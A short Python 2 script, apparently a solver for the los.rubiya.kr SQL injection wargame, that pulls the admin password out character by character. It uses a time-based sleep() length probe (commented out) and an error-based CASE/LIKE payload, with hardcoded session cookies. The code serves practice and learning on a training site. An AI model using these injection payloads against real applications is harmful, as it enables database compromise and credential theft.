#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 32
#hex(pw) length = 64
#pw = 32 ascii words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests,time

# select id,pw from test where id='guest' and pw='' or case id when id like "admin" and pw like "1%" then 'admin' else pow(2,999999) end;
# when id is correct then error happens

password=""
guestword=""
heex = "0123456789abcdef"
letter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
'''
for k in range(1,100):
	start = time.time()
	url="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=&pw=%27%20or%20id=%27admin%27%20and%20if(length(pw)="+str(k)+",sleep(3),0)%23"
	r = requests.post(url,cookies=(dict(PHPSESSID="dl3kg29sjr7uis2t6fgfa67th4")))
	end = time.time()
	print end-start
	print "Finding length of password : "+str(k)
	
	if end-start>3 :
		print "length is : " + str(k)
		length = k
		break
'''
k=8

for j in range(1,k+1):
	for i in heex:
		start = time.time()
		url="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=%27%20or%20case%20id%20when%20id=%27admin%27%20and%20pw%20like%20"+'"'+password+str(i)+"%"+'"'+"%20then%20%27admin%27%20else%209e307*2%20end%20%23"
		r = requests.post(url,cookies=(dict(PHPSESSID="ipnbtnb8p9m2j5c29adqsgdshk")))
		end = time.time()
		print "Finding " + str(j) +"th password's hex : " +str(i)
	
		if '</strong><hr><br>error' in r.text :
			password += str(i)
			print "password found :" + password
			break


